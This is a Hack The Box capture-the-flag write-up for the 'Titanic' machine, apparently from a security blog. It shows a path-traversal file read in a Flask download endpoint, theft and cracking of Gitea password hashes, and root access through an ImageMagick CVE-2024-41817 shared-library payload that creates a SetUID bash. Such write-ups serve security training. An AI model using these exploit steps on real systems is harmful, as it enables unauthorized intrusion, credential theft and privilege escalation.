---
title: HTB: Titanic
url: https://0xdf.gitlab.io/2025/06/21/htb-titanic.html
date: 2025-06-21T13:45:00+00:00
difficulty: Easy [20]
os: Linux
tags: htb-titanic, hackthebox, ctf, nmap, ubuntu, ffuf, subdomain, flask, feroxbuster, gitea, source-code, docker, burp, burp-repeater, directory-traversal, file-read, gitea-hash, htb-compiled, hashcat, image-magick, cve-2024-41817, shared-object
---

![Titanic](/img/titanic-cover.png)

Titanic offers a website and a Gitea instance with the source code. I’ll look at the source to identify a directory traversal / file read vulnerability. I’ll use that to read the Gitea DB and crack a hash from the users table. That password works over SSH as well. I’ll find a cron running as root that is running Image Magick on images in a given directory. I’ll exploit a CVE in Image Magick to get execution as root.

## Box Info

| Name | [Titanic](https://hackthebox.com/machines/titanic)  [Titanic](https://hackthebox.com/machines/titanic) [Play on HackTheBox](https://hackthebox.com/machines/titanic) |
| --- | --- |
| Release Date | [15 Feb 2025](https://twitter.com/hackthebox_eu/status/1890083550914854914) |
| Retire Date | 21 Jun 2025 |
| OS | Linux Linux |
| Base Points | Easy [20] |
| Rated Difficulty | Rated difficulty for Titanic |
| Radar Graph | Radar chart for Titanic |
| First Blood User | 00:03:05[jazzpizazz jazzpizazz](https://app.hackthebox.com/users/87804) |
| First Blood Root | 00:33:24[Vz0n Vz0n](https://app.hackthebox.com/users/1129266) |
| Creator | [ruycr4ft ruycr4ft](https://app.hackthebox.com/users/1253217) |

## Recon

### nmap

`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```

oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.55
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 13:45 EST
Nmap scan report for 10.10.11.55
Host is up (0.087s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.87 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.55
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-19 13:58 EST
Nmap scan report for 10.10.11.55
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Did not follow redirect to http://titanic.htb/
Service Info: Host: titanic.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.68 seconds

```

Based on the [OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) and [Apache](https://packages.ubuntu.com/search?keywords=apache2) versions, the host is likely running Ubuntu 22.04 jammy.

### Subdomain Fuzz

`nmap` shows that port 80 is sending a redirect to `titanic.htb`. I’ll use `ffuf` to fuzz for any subdomains of that domain that respond differently than the base domain:

```

oxdf@hacky$ ffuf -u http://10.10.11.55 -H "Host: FUZZ.titanic.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.55
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.titanic.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 101ms]
:: Progress: [19966/19966] :: Job [1/1] :: 469 req/sec :: Duration: [0:00:43] :: Errors: 0 ::

```

I’ll add both to my `/etc/hosts` file so I can interact with them:

```
10.10.11.55 titanic.htb dev.titanic.htb

```

### titanic.htb - TCP 80

#### Site

The site is for a cruise company:

![image-20250219140747256](/img/image-20250219140747256.png)

None of the links on the page go anywhere, but the Book buttons pop an overlay form:

![image-20250219141142778](/img/image-20250219141142778.png)

Submitting this returns a JSON file that gets downloaded to my host, with the name `[GUID].json`:

```

oxdf@hacky$ cat 575d8716-99ea-48d8-b209-e3a8bec90696.json | jq .
{
  "name": "0xdf",
  "email": "0xdf@titanic.htb",
  "phone": "1111111111",
  "date": "2026-01-01",
  "cabin": "Standard"
}

```

#### Tech Stack

The HTTP headers show the site is running on Werkzeug Python:

```

HTTP/1.1 200 OK
Date: Wed, 19 Feb 2025 19:08:48 GMT
Server: Werkzeug/3.0.3 Python/3.10.12
Content-Type: text/html; charset=utf-8
Vary: Accept-Encoding
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Length: 7399

```

This is almost certainly Flask. The 404 page matches the [default Flask 404](/cheatsheets/404#flask):

![image-20250219140947377](/img/image-20250219140947377.png)

Wappalyzer agrees:

![image-20250219141010899](/img/image-20250219141010899.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, but it doesn’t find anything interesting:

```

oxdf@hacky$ feroxbuster -u http://titanic.htb
                                                                                                                      
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://titanic.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
400      GET        1l        4w       41c http://titanic.htb/download
200      GET       30l       77w      567c http://titanic.htb/static/styles.css
200      GET      664l     5682w   412611c http://titanic.htb/static/assets/images/home.jpg
200      GET      890l     5324w   534018c http://titanic.htb/static/assets/images/entertainment.jpg
200      GET     2986l     7000w   469100c http://titanic.htb/static/assets/images/favicon.ico
200      GET      859l     5115w   510909c http://titanic.htb/static/assets/images/luxury-cabins.jpg
405      GET        5l       20w      153c http://titanic.htb/book
200      GET      851l     5313w   507854c http://titanic.htb/static/assets/images/exquisite-dining.jpg
200      GET      156l      415w     7399c http://titanic.htb/
403      GET        9l       28w      276c http://titanic.htb/server-status
[####################] - 2m     30012/30012   0s      found:10      errors:65     
[####################] - 2m     30000/30000   302/s   http://titanic.htb/

```

The `/book` endpoint returns 405 because it only accepts POST requests.

### dev.titanic.htb - TCP 80

#### Site

The dev site is hosting an instance of Gitea:

![image-20250219141615556](/img/image-20250219141615556.png)

Clicking Explore, there are two public repos:

![image-20250219142013319](/img/image-20250219142013319.png)

#### docker-config

The docker-config repo has two folders and a `README.md`:

![image-20250219142052518](/img/image-20250219142052518.png)

The `README.md` isn’t very interesting. Each of the folders have a `docker-compose.yml` file. The Gitea one shows a path where the Gitea data lives on the host and in the container:

```

version: '3'

services:
  gitea:
    image: gitea/gitea
    container_name: gitea
    ports:
      - "127.0.0.1:3000:3000"
      - "127.0.0.1:2222:22"  # Optional for SSH access
    volumes:
      - /home/developer/gitea/data:/data # Replace with your path
    environment:
      - USER_UID=1000
      - USER_GID=1000
    restart: always

```

The MySQL one has a password:

```

version: '3.8'

services:
  mysql:
    image: mysql:8.0
    container_name: mysql
    ports:
      - "127.0.0.1:3306:3306"
    environment:
      MYSQL_ROOT_PASSWORD: 'MySQLP@$$w0rd!'
      MYSQL_DATABASE: tickets 
      MYSQL_USER: sql_svc
      MYSQL_PASSWORD: sql_password
    restart: always

```

#### flask-app

The flask-app repo has the source code for `titanic.htb`:

![image-20250219142305063](/img/image-20250219142305063.png)

The only interesting bit is `app.py`, which shows all the routes. `/` returns the static page:

```

@app.route('/')
def index():
    return render_template('index.html')

```

`/book` takes a POST request and saves the data to a file with a random UUID filename, and then returns a redirect to `/download` with that filename:

```

@app.route('/book', methods=['POST'])
def book_ticket():
    data = {
        "name": request.form['name'],
        "email": request.form['email'],
        "phone": request.form['phone'],
        "date": request.form['date'],
        "cabin": request.form['cabin']
    }

    ticket_id = str(uuid4())
    json_filename = f"{ticket_id}.json"
    json_filepath = os.path.join(TICKETS_DIR, json_filename)

    with open(json_filepath, 'w') as json_file:
        json.dump(data, json_file)

    return redirect(url_for('download_ticket', ticket=json_filename))

```

`/download` passes a constant `TICKETS_DIR` (which is set to “tickets” at the top of the file) and the user input parameter to `os.path.join`, and then checks if that resulting file exists and sends it:

```

@app.route('/download', methods=['GET'])
def download_ticket():
    ticket = request.args.get('ticket')
    if not ticket:
        return jsonify({"error": "Ticket parameter is required"}), 400

    json_filepath = os.path.join(TICKETS_DIR, ticket)

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404

```

## Shell as developer

### File Read

#### HTTP Request Flow

When I submit a booking request to `/book`, it returns a 302 redirect to `/download`:

![image-20250219141457076](/img/image-20250219141457076.png)

`/download` uses the `ticket` parameter to return the JSON file:

![image-20250219141522720](/img/image-20250219141522720.png)

#### POC

Without looking at the source, I immediately thought this would be a potential directory traversal / file read vulnerability. The source all but confirms it. I’ll send the request for `/download` to Burp Repeater and change the `ticket` value to `/etc/passwd`:

![image-20250219142923282](/img/image-20250219142923282.png)

Without seeing the source, I would have tried something like `../../../../../../etc/passwd`, but seeing that it passes my input to `os.path.join`, I can exploit the way this behaves. I most recently showed this in my video on CVE-2023-37474 in CopyParty. [This link](https://www.youtube.com/watch?v=LVDBpON4_IQ&t=225s) leads to the point in that video where I demo how `os.path.join` behaves.

The intended behavior is something like this:

```

>>> import os
>>> os.path.join("tickets", "ticket.json")
'tickets/ticket.json'

```

But if any value passed into `os.path.join` starts with `/`, then all the values before it are dropped. For example:

```

>>> os.path.join("tickets", "/etc", "passwd")
'/etc/passwd'
>>> os.path.join("tickets", "/etc/passwd")
'/etc/passwd'

```

Looking a bit closer at the code, there are three possible responses while exploiting this:

```

    if os.path.exists(json_filepath):
        return send_file(json_filepath, as_attachment=True, download_name=ticket)
    else:
        return jsonify({"error": "Ticket not found"}), 404

```

If the given ticket is not found at all, `os.path.exist` returns false and it returns and error message:

```

oxdf@hacky$ curl 'http://titanic.htb/download?ticket=/etc/0xdf'
{"error":"Ticket not found"}

```

If the filepath is a file, it returns that file:

```

oxdf@hacky$ curl 'http://titanic.htb/download?ticket=/etc/hostname'
titanic

```

If it is a directory, it will exist, but then crash in `send_file`:

```

oxdf@hacky$ curl 'http://titanic.htb/download?ticket=/etc/'
<!doctype html>
<html lang=en>
<title>500 Internal Server Error</title>
<h1>Internal Server Error</h1>
<p>The server encountered an internal error and was unable to complete your request. Either the server is overloaded or there is an error in the application.</p>

```

This will allow me to check for the existence of directories.

#### User Flag

There’s only one non-root user in the `passwd` file that has a shell set, developer. I’ll see if the website can read `user.txt` from that user’s home directory:

![image-20250219143357613](/img/image-20250219143357613.png)

This is why the user flag for Titanic went in three minutes and five seconds.

### SSH

#### Locate Gitea DB

The `docker-compose.yml` file showed that Gitea was running with a shared volume in the developer user’s home directory:

```

    volumes:
      - /home/developer/gitea/data:/data

```

[This page](https://docs.gitea.com/installation/install-with-docker) has instructions for running Gitea from Docker, including:

> Customization files described [here](https://docs.gitea.com/administration/customizing-gitea) should be placed in `/data/gitea` directory. If using host volumes, it’s quite easy to access these files; for named volumes, this is done through another container or by direct access at `/var/lib/docker/volumes/gitea_gitea/_data`. The configuration file will be saved at `/data/gitea/conf/app.ini` after the installation.

I’ll check for that file, and it’s there:

![image-20250219144350031](/img/image-20250219144350031.png)

The most interesting thing in the config is the database info:

```

[database]
PATH = /data/gitea/gitea.db
DB_TYPE = sqlite3
HOST = localhost:3306
NAME = gitea
USER = root
PASSWD = 
LOG_SQL = false
SCHEMA = 
SSL_MODE = disable

```

It gives a path to the database, and I’ll find it there:

![image-20250219144501414](/img/image-20250219144501414.png)

#### Get Hashes

I’ll download the DB using `curl` (since getting it out of Burp is a trick):

```

oxdf@hacky$ curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 2036k  100 2036k    0     0  2587k      0 --:--:-- --:--:-- --:--:-- 2587k
oxdf@hacky$ file gitea.db 
gitea.db: SQLite 3.x database, last written using SQLite version 3045001, file counter 562, database pages 509, cookie 0x1d9, schema 4, UTF-8, version-valid-for 562

```

I’ll connect, and there’s a bunch of tables:

```

oxdf@hacky$ sqlite3 gitea.db
SQLite version 3.45.1 2024-01-30 16:01:20
Enter ".help" for usage hints.
sqlite> .tables
access                     oauth2_grant
access_token               org_user
action                     package
action_artifact            package_blob
action_run                 package_blob_upload
action_run_index           package_cleanup_rule
action_run_job             package_file
action_runner              package_property
action_runner_token        package_version
action_schedule            project
action_schedule_spec       project_board
action_task                project_issue
action_task_output         protected_branch
action_task_step           protected_tag
action_tasks_version       public_key
action_variable            pull_auto_merge
app_state                  pull_request
attachment                 push_mirror
auth_token                 reaction
badge                      release
branch                     renamed_branch
collaboration              repo_archiver
comment                    repo_indexer_status
commit_status              repo_redirect
commit_status_index        repo_topic
commit_status_summary      repo_transfer
dbfs_data                  repo_unit
dbfs_meta                  repository
deploy_key                 review
email_address              review_state
email_hash                 secret
external_login_user        session
follow                     star
gpg_key                    stopwatch
gpg_key_import             system_setting
hook_task                  task
issue                      team
issue_assignees            team_invite
issue_content_history      team_repo
issue_dependency           team_unit
issue_index                team_user
issue_label                topic
issue_user                 tracked_time
issue_watch                two_factor
label                      upload
language_stat              user
lfs_lock                   user_badge
lfs_meta_object            user_blocking
login_source               user_open_id
milestone                  user_redirect
mirror                     user_setting
notice                     version
notification               watch
oauth2_application         webauthn_credential
oauth2_authorization_code  webhook

```

I’ll start with the `user` table, as that’s where account password hashes are stored. The `user` table looks like:

```

sqlite> .headers on
sqlite> select * from user;
id|lower_name|name|full_name|email|keep_email_private|email_notifications_preference|passwd|passwd_hash_algo|must_change_password|login_type|login_source|login_name|type|location|website|rands|salt|language|description|created_unix|updated_unix|last_login_unix|last_repo_visibility|max_repo_creation|is_active|is_admin|is_restricted|allow_git_hook|allow_import_local|allow_create_organization|prohibit_login|avatar|avatar_email|use_custom_avatar|num_followers|num_following|num_stars|num_repos|num_teams|num_members|visibility|repo_admin_change_team_access|diff_view_style|theme|keep_activity_private
1|administrator|administrator||root@titanic.htb|0|enabled|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|pbkdf2$50000$50|0|0|0||0|||70a5bd0c1a5d23caa49030172cdcabdc|2d149e5fbd1b20cf31db3e3c6a28fc9b|en-US||1722595379|1722597477|1722597477|0|-1|1|1|0|0|0|1|0|2e1e70639ac6b0eecbdab4a3d19e0f44|root@titanic.htb|0|0|0|0|0|0|0|0|0||gitea-auto|0
2|developer|developer||developer@titanic.htb|0|enabled|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|pbkdf2$50000$50|0|0|0||0|||0ce6f07fc9b557bc070fa7bef76a0d15|8bf3e3452b78544f8bee9400d6936d34|en-US||1722595646|1722603397|1722603397|0|-1|1|0|0|0|0|1|0|e2d95b7e207e432f62f3508be406c11b|developer@titanic.htb|0|0|0|0|2|0|0|0|0||gitea-auto|0

```

Two long rows. I showed in [Compiled](/2024/12/14/htb-compiled.html#crack-gitea-hash) how to make a hash from this that can be cracked with `hashcat`. I’ll use the same command here:

```

oxdf@hacky$ sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
administrator:sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=

```

#### Crack Hashes

I’ll run these into `hashcat` with `rockyou.txt` to see what comes out:

```

oxdf@corum:~/hackthebox/titanic-10.10.11.55$ hashcat gitea.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

10900 | PBKDF2-HMAC-SHA256 | Generic KDF
...[snip]...
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
...[snip]...

```

It cracks developers to be “25282528”.

#### Shell

As developer is a system user on the box as well, I’ll connect over SSH as developer:

```

oxdf@hacky$ sshpass -p '25282528' ssh developer@titanic.htb
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-131-generic x86_64)
...[snip]...
developer@titanic:~$

```

`user.txt` is here if I hadn’t already read it.

## Shell as root

### Enumeration

#### Home Directories

There’s nothing of interest in developer’s home directory:

```

developer@titanic:~$ ls -la
total 40
drwxr-x--- 7 developer developer 4096 Feb  3 17:09 .
drwxr-xr-x 3 root      root      4096 Aug  1  2024 ..
lrwxrwxrwx 1 root      root         9 Jan 29 12:27 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer 3771 Jan  6  2022 .bashrc
drwx------ 3 developer developer 4096 Aug  1  2024 .cache
drwxrwxr-x 3 developer developer 4096 Aug  2  2024 gitea
drwxrwxr-x 5 developer developer 4096 Aug  1  2024 .local
drwxrwxr-x 2 developer developer 4096 Aug  2  2024 mysql
-rw-r--r-- 1 developer developer  807 Jan  6  2022 .profile
drwx------ 2 developer developer 4096 Aug  1  2024 .ssh
-rw-r----- 1 root      developer   33 Aug  2  2024 user.txt

```

Unsurprisingly, there’s no other directories in `/home`.

#### Processes

The processes on the system are only visible to the current user and root users:

```

developer@titanic:~$ ps auxww 
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
develop+    1165  0.0  0.8 1065008 33448 ?       Ss   Feb18   1:18 /usr/bin/python3 /opt/app/app.py
develop+    1616  0.1  4.2 1402504 170236 ?      Ssl  Feb18   3:28 /usr/local/bin/gitea web
develop+   72929  0.0  0.2  17072  9612 ?        Ss   19:53   0:00 /lib/systemd/systemd --user
develop+   73026  0.0  0.1   8680  5484 pts/0    Ss   19:53   0:00 -bash
develop+   73134  0.0  0.0  10072  1608 pts/0    R+   19:57   0:00 ps auxww

```

This is because `/proc` is mounted with the `hidepid` option set to `invisible`:

```

developer@titanic:~$ mount | grep "/proc "
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=invisible)

```

#### FileSystem

There are things in `/opt`:

```

developer@titanic:/$ ls /opt/
app  containerd  scripts

```

`app` contains the same stuff already analyzed in Gitea.

developer doesn’t have read access into `containerd`.

`scripts` contains a single `.sh` script:

```

developer@titanic:/opt/scripts$ ls
identify_images.sh

```

It’s only three lines:

```

cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log

```

`metadata.log` has information on each image in `images`:

```

developer@titanic:/opt/app/static/assets/images$ ls
entertainment.jpg  exquisite-dining.jpg  favicon.ico  home.jpg  luxury-cabins.jpg  metadata.log
developer@titanic:/opt/app/static/assets/images$ cat metadata.log 
/opt/app/static/assets/images/luxury-cabins.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280817B 0.000u 0:00.004
/opt/app/static/assets/images/entertainment.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 291864B 0.000u 0:00.000
/opt/app/static/assets/images/home.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 232842B 0.000u 0:00.000
/opt/app/static/assets/images/exquisite-dining.jpg JPEG 1024x1024 1024x1024+0+0 8-bit sRGB 280854B 0.000u 0:00.000

```

It also is owned by root and seems to be being written to every minute:

```

developer@titanic:/opt/app/static/assets/images$ ls -l metadata.log 
-rw-r----- 1 root developer 442 Feb 19 20:04 metadata.log
developer@titanic:/opt/app/static/assets/images$ date
Wed Feb 19 08:04:14 PM UTC 2025
developer@titanic:/opt/app/static/assets/images$ sleep 45; ls -l metadata.log 
-rw-r----- 1 root developer 442 Feb 19 20:05 metadata.log

```

This implies that the script is being run on a cron.

### CVE-2024-41817

#### Identify

developer has write access to the `images` folder, so it’s worth looking at what I might exploit here. The obvious target in that script is [Image Magick](https://imagemagick.org/index.php). The version on Titanic is 7.1.1-35:

```

developer@titanic:/opt/app/static/assets/images$ magick -version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)

```

Searching for CVEs, the top result in a [security advisory on the ImageMagick GitHub](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8):

![image-20250219150626388](/img/image-20250219150626388.png)

#### Vulnerability Details

The issue is with how some versions of ImageMagick are compiled in such a way that the current working directory being included in the search path for configuration files and shared libraries.

There are two ways to exploit this shown in the POCs section of the advisory. The first involves a `delegates.xml` file. I wasn’t able to get this to work, and it seems to need to be included in the call to `magick`.

The other POC involves writing a shared library to the same directory named `libxcb.so.1`. This is a shared library used low level interactions with the X11 Windowing system. What’s important here is that it’s loaded by Image Magick, and since the current directory is in the path checked for that, it will try to load it here.

#### POC

The POC in the advisory is to run this command to build the shared library:

```

gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF

```

And then see that running `magick` runs `id`:

```

$ ls -al
total 24
drwxr-xr-x 2 user user  4096 Jul 20 11:53 .
drwxrwxrwt 1 user user  4096 Jul 20 11:53 ..
-rwxr-xr-x 1 user user 16240 Jul 20 11:53 libxcb.so.1
$ id
uid=1000(user) gid=1000(user) groups=1000(user)
$ magick /dev/null /dev/null
uid=1000(user) gid=1000(user) groups=1000(user)

```

I can do that same thing on Titanic:

```

developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
developer@titanic:/opt/app/static/assets/images$ magick /dev/null /dev/null
uid=1000(developer) gid=1000(developer) groups=1000(developer)

```

When `magick` runs, it loads the library which calls `system("id")` in it’s constructor.

#### Shell

To get a shell, I’ll make a SetUID / SetGID copy of `bash`:

```

developer@titanic:/opt/app/static/assets/images$ gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("cp /bin/bash /tmp/0xdf; chmod 6777 /tmp/0xdf");
    exit(0);
}
EOF

```

This time I have to wait for the cron to run, as developer doesn’t have the privileges to run it. After the next minute rolls, my `bash` is there:

```

developer@titanic:/opt/app/static/assets/images$ ls -l /tmp/0xdf 
-rwsrwsrwx 1 root root 1396520 Feb 19 20:20 /tmp/0xdf

```

Running it with `-p` gives a root shell and the flag:

```

developer@titanic:/opt/app/static/assets/images$ /tmp/0xdf -p
0xdf-5.1# cat /root/root.txt
aa13708b************************

```